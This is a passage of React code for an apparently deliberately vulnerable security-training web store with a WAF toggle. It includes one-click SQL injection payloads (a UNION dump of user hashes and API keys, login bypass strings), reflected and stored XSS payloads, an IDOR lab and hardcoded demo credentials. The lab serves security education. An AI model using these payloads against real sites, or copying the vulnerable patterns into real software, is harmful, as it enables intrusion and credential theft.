                        <span className="text-cyan-700">Threat Score: {liveTargetResponse.threatScore}/100</span>
                      </div>
                      <p className="text-[11px] font-semibold text-slate-800">
                        {liveTargetResponse.evidence}
                      </p>
                    </div>

                    {/* Response Body Preview */}
                    <div className="space-y-1.5">
                      <div className="flex items-center justify-between text-[10px] font-bold uppercase tracking-wider text-slate-600">
                        <span>HTTP Response Body ({liveTargetResponse.body.length} bytes)</span>
                        <span className="font-mono text-slate-400">Target: {liveTargetResponse.targetUrl}</span>
                      </div>
                      <pre className="max-h-48 overflow-y-auto rounded-xl bg-slate-900 p-3 font-mono text-xs leading-relaxed text-emerald-400 shadow-inner">
                        {liveTargetResponse.body}
                      </pre>
                    </div>
                  </div>
                ) : (
                  <div className="rounded-2xl border border-dashed border-slate-300 bg-white p-6 text-center space-y-2">
                    <Globe2 className="size-8 text-slate-300 mx-auto" />
                    <h4 className="text-xs font-bold text-slate-700">Ready to test live target</h4>
                    <p className="text-[11px] text-slate-500 max-w-md mx-auto">
                      Choose a preset exploit vector above or customize your HTTP method, headers, and payload, then click{" "}
                      <strong className="text-cyan-700">Test Exploit</strong> to observe live WAF mitigation vs raw exploitation.
                    </p>
                  </div>
                )}
              </div>
            ) : (
              <>
                {/* Store Top Navigation Bar */}
                <div className="flex flex-wrap items-center justify-between border-b border-slate-200 bg-slate-50/90 px-4 py-2.5 gap-2">
              {/* Brand Logo */}
              <button
                type="button"
                onClick={() => navigateTo("home")}
                className="flex items-center gap-2.5 group text-left"
              >
                <div className="flex size-8 items-center justify-center rounded-xl bg-gradient-to-br from-cyan-600 to-blue-700 text-white font-black shadow-sm">
                  ⚡
                </div>
                <div>
                  <span className="text-sm font-extrabold tracking-tight text-slate-900 group-hover:text-cyan-700 transition">
                    Apex CyberStore
                  </span>
                  <p className="text-[8px] text-slate-500 uppercase tracking-wider font-semibold">
                    Enterprise Defense Platform
                  </p>
                </div>
              </button>

              {/* Navigation Menu Tabs */}
              <div className="flex items-center gap-1 overflow-x-auto">
                <button
                  type="button"
                  onClick={() => navigateTo("home")}
                  className={cn(
                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                    currentPage === "home"
                      ? "bg-cyan-600 text-white shadow-sm"
                      : "text-slate-600 hover:bg-slate-200 hover:text-slate-900"
                  )}
                >
                  <Home className="size-3.5" />
                  <span>Home</span>
                </button>

                <button
                  type="button"
                  onClick={() => navigateTo("products")}
                  className={cn(
                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                    currentPage === "products" || currentPage === "product-detail"
                      ? "bg-cyan-600 text-white shadow-sm"
                      : "text-slate-600 hover:bg-slate-200 hover:text-slate-900"
                  )}
                >
                  <Package className="size-3.5" />
                  <span>Products</span>
                </button>

                <button
                  type="button"
                  onClick={() => navigateTo("docs")}
                  className={cn(
                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                    currentPage === "docs"
                      ? "bg-cyan-600 text-white shadow-sm"
                      : "text-slate-600 hover:bg-slate-200 hover:text-slate-900"
                  )}
                >
                  <BookOpen className="size-3.5" />
                  <span>Docs</span>
                </button>

                <button
                  type="button"
                  onClick={() => navigateTo("contact")}
                  className={cn(
                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                    currentPage === "contact"
                      ? "bg-cyan-600 text-white shadow-sm"
                      : "text-slate-600 hover:bg-slate-200 hover:text-slate-900"
                  )}
                >
                  <Mail className="size-3.5" />
                  <span>Support</span>
                </button>

                {/* ── UNLOCKED WHEN SIGNED IN ── */}
                {currentUser && (
                  <>
                    <button
                      type="button"
                      onClick={() => navigateTo("dashboard")}
                      className={cn(
                        "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                        currentPage === "dashboard"
                          ? "bg-cyan-600 text-white"
                          : "text-slate-600 hover:bg-slate-200 hover:text-slate-900"
                      )}
                    >
                      <LayoutDashboard className="size-3.5" />
                      <span>Dashboard</span>
                    </button>

                    <button
                      type="button"
                      onClick={() => navigateTo("cart")}
                      className={cn(
                        "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                        currentPage === "cart"
                          ? "bg-cyan-600 text-white"
                          : "text-slate-600 hover:bg-slate-200 hover:text-slate-900"
                      )}
                    >
                      <ShoppingCart className="size-3.5" />
                      <span>Orders ({cart.length})</span>
                    </button>

                    {/* Admin Only Tools */}
                    {currentUser.role.includes("Admin") && (
                      <>
                        <button
                          type="button"
                          onClick={() => navigateTo("diagnostics")}
                          className={cn(
                            "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                            currentPage === "diagnostics"
                              ? "bg-emerald-600 text-white"
                              : "text-emerald-700 hover:bg-emerald-100"
                          )}
                        >
                          <Wrench className="size-3.5" />
                          <span>Diagnostics</span>
                        </button>

                        <button
                          type="button"
                          onClick={() => navigateTo("admin")}
                          className={cn(
                            "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                            currentPage === "admin"
                              ? "bg-amber-600 text-white"
                              : "text-amber-700 hover:bg-amber-100"
                          )}
                        >
                          <Unlock className="size-3.5" />
                          <span>Admin Vault</span>
                        </button>
                      </>
                    )}
                  </>
                )}
              </div>

              {/* User Session Bar */}
              <div className="flex items-center gap-2">
                {currentUser ? (
                  <div className="flex items-center gap-2 rounded-xl border border-slate-200 bg-white px-2.5 py-1 shadow-sm">
                    <span className="text-base">{currentUser.avatar}</span>
                    <div className="text-left leading-none">
                      <p className="text-[11px] font-bold text-slate-900">{currentUser.name}</p>
                      <p className="text-[9px] text-cyan-700 font-medium">{currentUser.role}</p>
                    </div>
                    <button
                      type="button"
                      onClick={() => {
                        setCurrentUser(null);
                        toast.info("Logged out.");
                        navigateTo("home");
                      }}
                      className="ml-1.5 text-slate-400 hover:text-red-600 transition"
                      title="Sign Out"
                    >
                      <LogOut className="size-3.5" />
                    </button>
                  </div>
                ) : (
                  <Button
                    size="sm"
                    onClick={() => navigateTo("login")}
                    className="h-8 gap-1.5 text-xs font-bold rounded-xl bg-cyan-600 text-white hover:bg-cyan-700 shadow-sm"
                  >
                    <Key className="size-3.5" /> Sign In
                  </Button>
                )}
              </div>
            </div>

            {/* In-Browser Alert Message */}
            {siteAlert && (
              <div
                className={cn(
                  "flex items-start justify-between border-b px-4 py-2.5 text-xs transition-all",
                  siteAlert.type === "error"
                    ? "border-red-200 bg-red-50 text-red-900"
                    : siteAlert.type === "warning"
                    ? "border-emerald-200 bg-emerald-50 text-emerald-900"
                    : "border-cyan-200 bg-cyan-50 text-cyan-900"
                )}
              >
                <div className="flex items-start gap-2.5">
                  <span className="text-base">
                    {siteAlert.type === "error" ? "💥" : siteAlert.type === "warning" ? "🛡️" : "✅"}
                  </span>
                  <div>
                    <p className="font-bold">{siteAlert.title}</p>
                    <p className="text-[11px] opacity-90">{siteAlert.detail}</p>
                  </div>
                </div>
                <button
                  type="button"
                  onClick={() => setSiteAlert(null)}
                  className="text-slate-500 hover:text-slate-900 ml-2"
                >
                  <X className="size-3.5" />
                </button>
              </div>
            )}

            {/* Active Exploit Popout Visualizer (Shows ONLY when an attack succeeds in WAF OFF mode) */}
            {activeExploitDisplay && !activeWaf && (
              <div className="border-b-2 border-red-300 bg-red-50 p-4 transition-all animate-in fade-in">
                <div className="flex items-start justify-between">
                  <div className="flex items-center gap-2">
                    <span className="flex size-7 items-center justify-center rounded-lg bg-red-100 text-red-700 font-bold">
                      ⚠️
                    </span>
                    <div>
                      <h4 className="text-sm font-extrabold text-red-900">{activeExploitDisplay.title}</h4>
                      <p className="text-xs text-red-700">{activeExploitDisplay.description}</p>
                    </div>
                  </div>
                  <Button
                    size="sm"
                    variant="ghost"
                    className="h-7 text-xs text-red-700 hover:text-red-900"
                    onClick={() => setActiveExploitDisplay(null)}
                  >
                    Dismiss
                  </Button>
                </div>

                <div className="mt-2.5 rounded-xl border border-red-200 bg-white p-3 font-mono text-xs shadow-sm">
                  <p className="text-[10px] font-bold uppercase tracking-wider text-red-700 mb-1">
                    Captured Backend Exploit Evidence:
                  </p>
                  <pre className="overflow-x-auto text-[11px] text-slate-800 leading-relaxed font-semibold">
                    {activeExploitDisplay.evidence}
                  </pre>

                  {/* Render extracted table data if present */}
                  {Array.isArray(activeExploitDisplay.data) && (
                    <div className="mt-2 overflow-x-auto border-t border-red-100 pt-2">
                      <table className="w-full text-left text-[10px] text-slate-700">
                        <thead>
                          <tr className="border-b border-slate-200 text-red-800 font-bold">
                            <th className="py-1">Username</th>
                            <th className="py-1">Role</th>
                            <th className="py-1">Password Hash</th>
                            <th className="py-1">Exfiltrated Secret</th>
                          </tr>
                        </thead>
                        <tbody>
                          {activeExploitDisplay.data.map((row, idx) => (
                            <tr key={idx} className="border-b border-slate-100 font-mono">
                              <td className="py-1 font-bold text-cyan-800">{row.user}</td>
                              <td className="py-1 text-amber-800">{row.role}</td>
                              <td className="py-1 text-slate-500">{row.pass_hash}</td>
                              <td className="py-1 text-red-700 font-semibold">{row.secret}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* ═══════════════════════════════════════════════════════════════
                PAGE ROUTER: Realistic Multi-Page View
            ════════════════════════════════════════════════════════════════ */}
            <div className="min-h-[500px] max-h-[680px] overflow-y-auto bg-slate-50/50 p-5">
              {navigating ? (
                <div className="flex flex-col items-center justify-center py-28 gap-3">
                  <span className="size-8 animate-spin rounded-full border-3 border-cyan-600/30 border-t-cyan-600" />
                  <p className="text-xs text-slate-500 font-mono">Loading resource...</p>
                </div>
              ) : (
                <>
                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 1: INITIAL CLEAN PUBLIC HOME PAGE
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "home" && (
                    <div className="space-y-6">
                      {/* Hero Section */}
                      <div className="relative overflow-hidden rounded-3xl bg-gradient-to-br from-cyan-50 via-blue-50/60 to-indigo-50 border border-slate-200 p-7 shadow-sm">
                        <div className="relative z-10 max-w-lg space-y-3">
                          <div className="inline-flex items-center gap-1.5 rounded-full bg-cyan-100 text-cyan-800 px-3 py-1 text-[10px] font-bold border border-cyan-200">
                            🛡️ Next-Gen Zero-Trust Architecture & Threat Shield
                          </div>
                          <h1 className="text-2xl md:text-3xl font-black tracking-tight text-slate-900">
                            Apex Cloud & Security Platform
                          </h1>
                          <p className="text-xs text-slate-600 leading-relaxed font-medium">
                            Protecting enterprise cloud infrastructure with military-grade hardware authenticators,
                            edge firewalls, and AI-driven SOC telemetry.
                          </p>

                          <div className="pt-2 flex flex-wrap gap-2.5">
                            <Button
                              size="sm"
                              onClick={() => navigateTo("products")}
                              className="h-9 gap-1.5 text-xs font-bold rounded-xl bg-cyan-600 text-white hover:bg-cyan-700 shadow-sm"
                            >
                              Explore Product Catalog →
                            </Button>
                            {!currentUser ? (
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => navigateTo("login")}
                                className="h-9 gap-1.5 text-xs font-bold rounded-xl border-slate-300 bg-white text-slate-800 hover:bg-slate-100"
                              >
                                <Key className="size-3.5 text-cyan-600" /> Sign In to Portal
                              </Button>
                            ) : (
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => navigateTo("dashboard")}
                                className="h-9 gap-1.5 text-xs font-bold rounded-xl border-cyan-300 bg-white text-cyan-800 hover:bg-cyan-50"
                              >
                                <LayoutDashboard className="size-3.5" /> Open My Dashboard
                              </Button>
                            )}
                          </div>
                        </div>
                      </div>

                      {/* Stats Overview */}
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                        {[
                          { label: "Hardware Keys Active", value: "248,000+", icon: <Key className="size-4 text-cyan-600" /> },
                          { label: "Uptime SLA", value: "99.999%", icon: <TrendingUp className="size-4 text-emerald-600" /> },
                          { label: "Threats Blocked", value: "1.4M / day", icon: <Shield className="size-4 text-amber-600" /> },
                          { label: "Enterprise Customers", value: "4,200+", icon: <Users className="size-4 text-indigo-600" /> },
                        ].map((stat, idx) => (
                          <div key={idx} className="rounded-2xl border border-slate-200 bg-white p-3.5 space-y-1 shadow-sm">
                            <div className="flex items-center justify-between">
                              <span className="text-[10px] text-slate-500 font-semibold">{stat.label}</span>
                              {stat.icon}
                            </div>
                            <p className="font-mono font-bold text-base text-slate-900">{stat.value}</p>
                          </div>
                        ))}
                      </div>

                      {/* Featured Products Teaser */}
                      <div className="space-y-3">
                        <div className="flex items-center justify-between">
                          <h3 className="text-sm font-bold text-slate-900 flex items-center gap-2">
                            <Package className="size-4 text-cyan-600" /> Featured Hardware & Cloud Appliances
                          </h3>
                          <button
                            type="button"
                            onClick={() => navigateTo("products")}
                            className="text-xs text-cyan-700 hover:underline font-bold"
                          >
                            View all 6 items →
                          </button>
                        </div>

                        <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                          {PRODUCTS.slice(0, 3).map((p) => (
                            <div
                              key={p.id}
                              className="rounded-2xl border border-slate-200 bg-white p-4 flex flex-col justify-between hover:border-cyan-500 transition group shadow-sm"
                            >
                              <div>
                                <div className="flex items-center justify-between">
                                  <span className="text-3xl p-2 rounded-xl bg-slate-100">{p.icon}</span>
                                  {p.badge && (
                                    <span className="rounded-full bg-cyan-50 border border-cyan-200 px-2 py-0.5 text-[8px] font-bold text-cyan-700">
                                      {p.badge}
                                    </span>
                                  )}
                                </div>
                                <h4 className="mt-3 text-xs font-bold text-slate-900 group-hover:text-cyan-700 transition">
                                  {p.name}
                                </h4>
                                <p className="mt-1 text-[10px] text-slate-500 line-clamp-2">{p.description}</p>
                              </div>
                              <div className="mt-3 pt-2.5 border-t border-slate-100 flex items-center justify-between">
                                <span className="font-mono font-extrabold text-sm text-cyan-700">
                                  ${p.price.toFixed(2)}
                                </span>
                                <Button
                                  size="sm"
                                  variant="ghost"
                                  onClick={() => {
                                    setSelectedProduct(p);
                                    navigateTo("product-detail");
                                  }}
                                  className="h-7 text-xs font-semibold text-slate-700 hover:text-slate-900"
                                >
                                  Details →
                                </Button>
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Call-to-action to Sign In */}
                      {!currentUser && (
                        <div className="rounded-2xl border border-cyan-200 bg-cyan-50/70 p-4 flex items-center justify-between">
                          <div className="flex items-center gap-3">
                            <span className="text-2xl">🔐</span>
                            <div>
                              <p className="text-xs font-bold text-slate-900">Sign In to Access Customer & Executive Tools</p>
                              <p className="text-[10px] text-slate-600">
                                Unlocks Shopping Cart Orders, System Diagnostics Console, and Secret Executive Admin Vault.
                              </p>
                            </div>
                          </div>
                          <Button
                            size="sm"
                            onClick={() => navigateTo("login")}
                            className="h-8 text-xs font-bold bg-cyan-600 text-white hover:bg-cyan-700 rounded-xl shadow-sm"
                          >
                            Sign In Now
                          </Button>
                        </div>
                      )}
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 2: FULL PRODUCT CATALOG (SEARCH VULNERABLE TO SQLI/XSS)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "products" && (
                    <div className="space-y-6">
                      <div>
                        <h2 className="text-lg font-bold text-slate-900 flex items-center gap-2">
                          <Package className="size-5 text-cyan-600" /> Product & Appliance Catalog
                        </h2>
                        <p className="text-xs text-slate-500 mt-0.5">
                          Browse all certified security authenticators and managed defense platforms.
                        </p>
                      </div>

                      {/* Search Bar & Category Filter */}
                      <div className="space-y-3">
                        <div className="flex flex-wrap gap-2 items-center justify-between">
                          <div className="relative flex-1 min-w-[240px]">
                            <Search className="absolute left-3 top-1/2 size-4 -translate-y-1/2 text-slate-400" />
                            <Input
                              value={searchQuery}
                              onChange={(e) => handleStoreSearch(e.target.value)}
                              placeholder="Search products by keyword or test exploit payload..."
                              className="h-9 pl-9 pr-8 font-mono text-xs border-slate-300 bg-white text-slate-900 focus-visible:ring-cyan-500"
                            />
                            {searchQuery && (
                              <button
                                type="button"
                                onClick={() => handleStoreSearch("")}
                                className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-900"
                              >
                                <X className="size-3.5" />
                              </button>
                            )}
                          </div>

                          <div className="flex items-center gap-1.5 overflow-x-auto">
                            {[
                              { id: "all", label: "All Items" },
                              { id: "tokens", label: "Tokens" },
                              { id: "hardware", label: "Hardware" },
                              { id: "cloud", label: "Cloud" },
                              { id: "software", label: "Software" },
                            ].map((cat) => (
                              <button
                                key={cat.id}
                                type="button"
                                onClick={() => setSelectedCategory(cat.id)}
                                className={cn(
                                  "rounded-lg px-2.5 py-1 text-[11px] font-semibold transition",
                                  selectedCategory === cat.id
                                    ? "bg-cyan-600 text-white shadow-sm font-bold"
                                    : "bg-white border border-slate-200 text-slate-600 hover:text-slate-900 hover:bg-slate-100"
                                )}
                              >
                                {cat.label}
                              </button>
                            ))}
                          </div>
                        </div>

                        {/* Quick Attack Injection Bar */}
                        <div className="rounded-xl border border-red-200 bg-red-50/70 p-2.5 flex flex-wrap items-center gap-2">
                          <span className="text-[10px] font-bold uppercase tracking-wider text-red-800 flex items-center gap-1">
                            <Flame className="size-3.5 text-red-600" /> Test Search Attacks:
                          </span>
                          {[
                            { label: "SQLi Union Dump", payload: "' UNION SELECT 1,username,password_hash,api_key FROM users--" },
                            { label: "Reflected XSS", payload: "<script>alert('XSS reflected on ' + document.domain)</script>" },
                            { label: "Boolean SQLi", payload: "' OR 1=1--" },
                          ].map((atk) => (
                            <button
                              key={atk.label}
                              type="button"
                              onClick={() => handleStoreSearch(atk.payload)}
                              className="rounded-md border border-red-300 bg-white px-2 py-0.5 text-[9px] font-mono text-red-700 hover:bg-red-100 transition shadow-sm"
                            >
                              {atk.label}
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Product Grid */}
                      <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
                        {filteredProducts.map((p) => (
                          <div
                            key={p.id}
                            className="flex flex-col justify-between rounded-2xl border border-slate-200 bg-white p-4 hover:border-cyan-500 transition group shadow-sm"
                          >
                            <div>
                              <div className="flex items-start justify-between">
                                <span className="text-3xl p-2.5 rounded-xl bg-slate-100">{p.icon}</span>
                                {p.badge && (
                                  <span className="rounded-full bg-cyan-50 border border-cyan-200 px-2 py-0.5 text-[8px] font-bold text-cyan-700">
                                    {p.badge}
                                  </span>
                                )}
                              </div>
                              <h3 className="mt-3 text-xs font-bold text-slate-900 group-hover:text-cyan-700 transition">
                                {p.name}
                              </h3>
                              <p className="mt-1 text-[10px] text-slate-500 line-clamp-2 leading-relaxed">
                                {p.description}
                              </p>
                              <div className="mt-3 flex items-center gap-1 text-[10px] text-amber-500">
                                <Star className="size-3 fill-amber-400" />
                                <span className="font-bold text-slate-900">{p.rating}</span>
                                <span className="text-slate-400">({p.reviewsCount} reviews)</span>
                              </div>
                            </div>

                            <div className="mt-4 pt-3 border-t border-slate-100 flex items-center justify-between">
                              <p className="font-mono font-extrabold text-sm text-cyan-700">${p.price.toFixed(2)}</p>
                              <div className="flex items-center gap-1.5">
                                <Button
                                  size="sm"
                                  variant="outline"
                                  onClick={() => {
                                    setSelectedProduct(p);
                                    navigateTo("product-detail");
                                  }}
                                  className="h-7 text-xs font-semibold rounded-lg border-slate-300 hover:border-cyan-600"
                                >
                                  Specs
                                </Button>
                                <Button
                                  size="sm"
                                  onClick={() => {
                                    setCart((prev) => {
                                      const exist = prev.find((item) => item.product.id === p.id);
                                      if (exist) {
                                        return prev.map((item) =>
                                          item.product.id === p.id ? { ...item, quantity: item.quantity + 1 } : item
                                        );
                                      }
                                      return [...prev, { product: p, quantity: 1 }];
                                    });
                                    toast.success(`Added ${p.name} to Cart`);
                                  }}
                                  className="h-7 px-2 rounded-lg bg-cyan-50 text-cyan-700 hover:bg-cyan-100 border border-cyan-200"
                                  title="Add to Cart"
                                >
                                  <Plus className="size-3.5" />
                                </Button>
                              </div>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 3: PRODUCT DETAIL & REVIEWS (STORED XSS)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "product-detail" && selectedProduct && (
                    <div className="space-y-6">
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => navigateTo("products")}
                        className="gap-1.5 text-xs text-slate-500 hover:text-slate-900 h-8"
                      >
                        <ArrowLeft className="size-3.5" /> Back to Catalog
                      </Button>

                      <div className="grid grid-cols-1 md:grid-cols-12 gap-6 items-start">
                        {/* Product Overview Card */}
                        <div className="md:col-span-5 rounded-2xl border border-slate-200 bg-white p-6 flex flex-col items-center text-center space-y-3 shadow-sm">
                          <span className="text-6xl p-6 rounded-3xl bg-slate-100 shadow-inner">
                            {selectedProduct.icon}
                          </span>
                          <h2 className="text-base font-bold text-slate-900">{selectedProduct.name}</h2>
                          <p className="text-xs text-slate-500">{selectedProduct.description}</p>
                          <p className="font-mono text-2xl font-black text-cyan-700">
                            ${selectedProduct.price.toFixed(2)}
                          </p>
                          <Button
                            onClick={() => {
                              setCart((prev) => [...prev, { product: selectedProduct, quantity: 1 }]);
                              toast.success(`Added to Cart`);
                              navigateTo("cart");
                            }}
                            className="w-full h-9 rounded-xl font-bold text-xs bg-cyan-600 text-white hover:bg-cyan-700 gap-2 shadow-sm"
                          >
                            <ShoppingCart className="size-4" /> Add to Cart & Checkout
                          </Button>
                        </div>

                        {/* Specs & Reviews (Stored XSS Target) */}
                        <div className="md:col-span-7 space-y-4">
                          <div className="rounded-2xl border border-slate-200 bg-white p-5 space-y-3 shadow-sm">
                            <h3 className="text-xs font-bold uppercase tracking-wider text-slate-500">
                              Technical Specifications
                            </h3>
                            <div className="grid grid-cols-2 gap-2">
                              {selectedProduct.specs.map((spec, i) => (
                                <div key={i} className="flex items-center gap-2 rounded-xl bg-slate-50 p-2.5 text-xs border border-slate-200">
                                  <CheckCircle2 className="size-3.5 text-emerald-600 shrink-0" />
                                  <span className="text-slate-700 font-medium">{spec}</span>
                                </div>
                              ))}
                            </div>
                          </div>

                          {/* Customer Reviews Box */}
                          <div className="rounded-2xl border border-slate-200 bg-white p-5 space-y-4 shadow-sm">
                            <h3 className="text-sm font-bold text-slate-900 flex items-center gap-2">
                              <MessageSquare className="size-4 text-cyan-600" />
                              Customer Reviews ({reviews.length})
                            </h3>

                            {/* Write Review Form */}
                            <div className="rounded-xl border border-slate-200 bg-slate-50 p-3 space-y-2.5">
                              <div className="flex justify-between items-center">
                                <Input
                                  value={newReviewAuthor}
                                  onChange={(e) => setNewReviewAuthor(e.target.value)}
                                  placeholder="Your Name"
                                  className="h-8 max-w-[200px] text-xs font-mono bg-white border-slate-300 text-slate-900"
                                />
                                <div className="flex items-center gap-1">
                                  {[1, 2, 3, 4, 5].map((star) => (
                                    <button
                                      key={star}
                                      type="button"
                                      onClick={() => setNewReviewRating(star)}
                                      className="p-0.5"
                                    >
                                      <Star
                                        className={cn(
                                          "size-4",
                                          star <= newReviewRating
                                            ? "text-amber-500 fill-amber-400"
                                            : "text-slate-300"
                                        )}
                                      />
                                    </button>
                                  ))}
                                </div>
                              </div>

                              <Textarea
                                value={newReviewComment}
                                onChange={(e) => setNewReviewComment(e.target.value)}
                                placeholder="Enter review or test Stored XSS (e.g. <script>alert('Stored XSS')</script>)..."
                                className="min-h-16 text-xs font-mono bg-white border-slate-300 text-slate-900 resize-none"
                              />

                              <div className="flex flex-wrap items-center gap-1.5 pt-1 border-t border-slate-200">
                                <span className="text-[9px] font-bold text-red-700 uppercase tracking-wider">
                                  XSS Payloads:
                                </span>
                                {[
                                  "<script>alert('Stored XSS in Review')</script>",
                                  "<img src=x onerror=alert('Session Stolen!')>",
                                ].map((payload) => (
                                  <button
                                    key={payload}
                                    type="button"
                                    onClick={() => setNewReviewComment(payload)}
                                    className="rounded border border-red-300 bg-red-50 px-1.5 py-0.5 font-mono text-[9px] text-red-700 hover:bg-red-100"
                                  >
                                    {payload.slice(0, 24)}...
                                  </button>
                                ))}
                                <Button
                                  size="sm"
                                  onClick={handleAddReview}
                                  className="ml-auto h-7 text-xs font-bold bg-cyan-600 text-white hover:bg-cyan-700 rounded-lg shadow-sm"
                                >
                                  Post Review
                                </Button>
                              </div>
                            </div>

                            {/* Reviews Feed */}
                            <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
                              {reviews.map((rev) => (
                                <div
                                  key={rev.id}
                                  className={cn(
                                    "rounded-xl border p-3 text-xs space-y-1 transition",
                                    rev.isExploit
                                      ? "border-red-300 bg-red-50 text-red-900"
                                      : "border-slate-200 bg-white text-slate-800"
                                  )}
                                >
                                  <div className="flex items-center justify-between">
                                    <span className="font-bold flex items-center gap-1.5">
                                      <User className="size-3 text-slate-500" /> {rev.author}
                                      {rev.isExploit && (
                                        <span className="rounded bg-red-100 text-red-800 border border-red-200 px-1 py-0.2 text-[8px] font-bold">
                                          STORED XSS
                                        </span>
                                      )}
                                    </span>
                                    <span className="text-[10px] text-slate-400">{rev.date}</span>
                                  </div>
                                  <p className="font-mono text-[11px] text-slate-600">{rev.comment}</p>
                                </div>
                              ))}
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 4: SIGN IN / AUTHENTICATION (SQL INJECTION BYPASS)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "login" && (
                    <div className="max-w-md mx-auto space-y-6 py-4">
                      <div className="text-center space-y-1.5">
                        <div className="mx-auto flex size-12 items-center justify-center rounded-2xl bg-cyan-100 text-cyan-700 text-xl shadow-sm border border-cyan-200">
                          🔐
                        </div>
                        <h2 className="text-lg font-bold text-slate-900">Sign In to Apex CyberStore</h2>
                        <p className="text-xs text-slate-500">
                          Authenticate your session to unlock customer orders and executive tools
                        </p>
                      </div>

                      {/* Login Form */}
                      <form
                        onSubmit={(e) => {
                          e.preventDefault();
                          const form = e.currentTarget;
                          const uname = (form.elements.namedItem("uname") as HTMLInputElement).value;
                          const pword = (form.elements.namedItem("pword") as HTMLInputElement).value;
                          handleLoginSubmit(uname, pword);
                        }}
                        className="rounded-2xl border border-slate-200 bg-white p-5 space-y-4 shadow-md"
                      >
                        <div>
                          <label className="block text-[11px] font-bold text-slate-700 mb-1">
                            Username / Email
                          </label>
                          <Input
                            name="uname"
                            defaultValue="admin'--"
                            placeholder="admin or enter SQLi bypass"
                            className="h-9 font-mono text-xs bg-white border-slate-300 text-slate-900"
                          />
                        </div>

                        <div>
                          <label className="block text-[11px] font-bold text-slate-700 mb-1">Password</label>
                          <Input
                            name="pword"
                            type="password"
                            defaultValue="password123"
                            placeholder="••••••••"
                            className="h-9 font-mono text-xs bg-white border-slate-300 text-slate-900"
                          />
                        </div>

                        <Button type="submit" className="w-full h-9 rounded-xl font-bold text-xs bg-cyan-600 text-white hover:bg-cyan-700 shadow-sm">
                          Sign In →
                        </Button>
                      </form>

                      {/* 1-Click SQLi Login Bypass Vectors */}
                      <div className="rounded-2xl border border-red-200 bg-red-50/70 p-4 space-y-2.5">
                        <p className="text-[10px] font-bold uppercase tracking-wider text-red-800 flex items-center gap-1.5">
                          <Flame className="size-3.5 text-red-600" /> 1-Click SQL Injection Bypass:
                        </p>
                        <div className="flex flex-wrap gap-1.5">
                          {[
                            "admin'--",
                            "' OR '1'='1'--",
                            "admin'/*",
                          ].map((payload) => (
                            <button
                              key={payload}
                              type="button"
                              onClick={() => handleLoginSubmit(payload, "any_pass")}
                              className="rounded-md border border-red-300 bg-white px-2 py-1 text-[10px] font-mono text-red-700 hover:bg-red-100 transition shadow-sm"
                            >
                              {payload}
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Demo User Switcher */}
                      <div className="rounded-2xl border border-slate-200 bg-white p-3.5 text-center space-y-2 shadow-sm">
                        <p className="text-[10px] font-bold text-slate-500 uppercase tracking-wider">
                          Or Sign In with Demo Credentials:
                        </p>
                        <div className="flex flex-wrap justify-center gap-2">
                          <button
                            type="button"
                            onClick={() => handleLoginSubmit("admin", "admin123")}
                            className="rounded-lg border border-slate-200 bg-slate-50 px-2.5 py-1 text-xs text-slate-800 hover:border-cyan-600 font-medium"
                          >
                            👑 Admin (admin/admin123)
                          </button>
                          <button
                            type="button"
                            onClick={() => handleLoginSubmit("jsmith", "password")}
                            className="rounded-lg border border-slate-200 bg-slate-50 px-2.5 py-1 text-xs text-slate-800 hover:border-cyan-600 font-medium"
                          >
                            💻 Developer (jsmith/password)
                          </button>
                          <button
                            type="button"
                            onClick={() => handleLoginSubmit("customer", "customer123")}
                            className="rounded-lg border border-slate-200 bg-slate-50 px-2.5 py-1 text-xs text-slate-800 hover:border-cyan-600 font-medium"
                          >
                            👤 Customer (customer/customer123)
                          </button>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 5: ORDERS & CART (IDOR ORDER LOOKUP)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "cart" && (
                    <div className="space-y-6">
                      <h2 className="text-lg font-bold text-slate-900 flex items-center gap-2">
                        <ShoppingCart className="size-5 text-cyan-600" />
                        Customer Orders & Invoices (IDOR Lab)
                      </h2>

                      <div className="grid grid-cols-1 md:grid-cols-12 gap-6 items-start">
                        {/* Cart Items */}
                        <div className="md:col-span-6 rounded-2xl border border-slate-200 bg-white p-5 space-y-3 shadow-sm">
                          <h3 className="text-xs font-bold uppercase tracking-wider text-slate-500">
                            Active Shopping Cart ({cart.length} items)
                          </h3>
                          {cart.map((item, idx) => (
                            <div key={idx} className="flex justify-between items-center border-b border-slate-100 pb-2.5">
                              <div className="flex items-center gap-2.5">
